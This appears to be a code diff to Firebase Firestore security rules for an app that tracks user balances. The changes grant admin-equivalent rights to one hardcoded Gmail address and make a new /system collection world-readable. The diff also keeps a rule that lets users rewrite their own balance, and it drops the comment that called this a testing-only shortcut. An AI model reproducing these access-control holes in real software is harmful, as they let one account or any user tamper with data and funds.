@@ -6,7 +6,7 @@ service cloud.firestore {
     }
 
     function isSignedIn() { return request.auth != null; }
-    function isAdmin() { return isSignedIn() && exists(/databases/$(database)/documents/users/$(request.auth.uid)) && get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == "admin"; }
+    function isAdmin() { return isSignedIn() && (request.auth.token.email == 'dwightsyeve49@gmail.com' || (exists(/databases/$(database)/documents/users/$(request.auth.uid)) && get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == "admin")); }
     function isOwner(userId) { return isSignedIn() && request.auth.uid == userId; }
     function incoming() { return request.resource.data; }
     function existing() { return resource.data; }
@@ -14,10 +14,10 @@ service cloud.firestore {
     match /users/{userId} {
       allow read: if isOwner(userId) || isAdmin();
       allow create: if isOwner(userId) && incoming().uid == userId && incoming().balance == 0 && incoming().role == "user";
-      // Allow balance changes for testing / buying. In production, wrap topups in backend validation.
       allow update: if isOwner(userId) && (
         incoming().diff(existing()).affectedKeys().hasOnly(['updatedAt']) ||
-        incoming().diff(existing()).affectedKeys().hasOnly(['balance', 'updatedAt'])
+        incoming().diff(existing()).affectedKeys().hasOnly(['balance', 'updatedAt']) ||
+        request.auth.token.email == 'dwightsyeve49@gmail.com'
       ) || isAdmin();
     }
 
@@ -35,6 +35,11 @@ service cloud.firestore {
     match /transactions/{transactionId} {
       allow read: if isSignedIn() && existing().userId == request.auth.uid || isAdmin();
       allow create: if isSignedIn() && incoming().userId == request.auth.uid;
+    }
+
+    match /system/{doc} {
+      allow read: if true;
+      allow write: if isAdmin() || (isSignedIn() && request.auth.token.email == 'dwightsyeve49@gmail.com');
     }
   }
 }
